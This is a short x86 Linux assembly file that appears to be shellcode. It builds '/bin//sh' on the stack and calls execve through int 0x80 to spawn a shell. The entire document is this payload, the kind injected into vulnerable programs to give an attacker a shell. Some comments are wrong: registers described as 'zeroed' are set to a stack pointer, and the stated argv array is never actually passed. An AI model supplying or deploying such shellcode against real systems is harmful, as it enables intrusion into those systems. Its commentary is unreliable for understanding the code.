global _start

section .text

_start:
    xor eax, eax    ; Zeroes eax register
    
    push eax        ; Push null into stack
    mov ecx, esp    ; Zeroing ecx register
    mov edx, esp    ; Zeroing edx register

    push eax        ; For //sh
    push eax        ; For /bin
   
    ; [ /bin//sh | null ] 
    mov dword[esp], "/bin"
    mov dword[esp +4], "//sh"
    mov ebx, esp    ; 1st arg - ebx - "/bin//sh"

    ; [ ptr to /bin//sh | null | /bin//sh | null ] 
    push eax        ; To push null terminator to stack
    push ebx        ; To push ptr to /bin//sh to stack

    ; execve("/bin//sh",["/bin//sh", 0], 0)
    add al, 11
    int 0x80 
